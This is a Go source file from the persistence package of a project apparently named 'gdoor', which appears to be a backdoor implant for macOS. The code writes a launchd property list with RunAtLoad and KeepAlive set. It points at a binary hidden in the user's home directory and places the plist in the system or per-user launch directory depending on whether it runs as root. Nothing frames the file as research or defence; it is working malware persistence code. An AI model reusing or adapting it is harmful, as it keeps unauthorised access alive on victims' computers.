package persist

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"

	"gdoor/config"
	"gdoor/debug"
	"gdoor/info"
)

func setPlist(i *info.Info) {
	plist_fmt := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>%s</string>
  <key>ProgramArguments</key>
  <array>
    <string>%s</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
`

	plist := fmt.Sprintf(plist_fmt, config.PlistName, filepath.Join(i.GetHomePath(), config.TargetDir, config.TargetName))

	plistDir := config.RPlistDir
	if i.GetCurUser() != "root" {
		plistDir = filepath.Join(i.GetHomePath(), config.PlistDir)
	}
	if err := os.MkdirAll(plistDir, 0755); err != nil {
		debug.Println(err)
		return
	}

	if err := ioutil.WriteFile(filepath.Join(plistDir, config.PlistName+".plist"), []byte(plist), 0644); err != nil {
		debug.Println(err)
	}
}
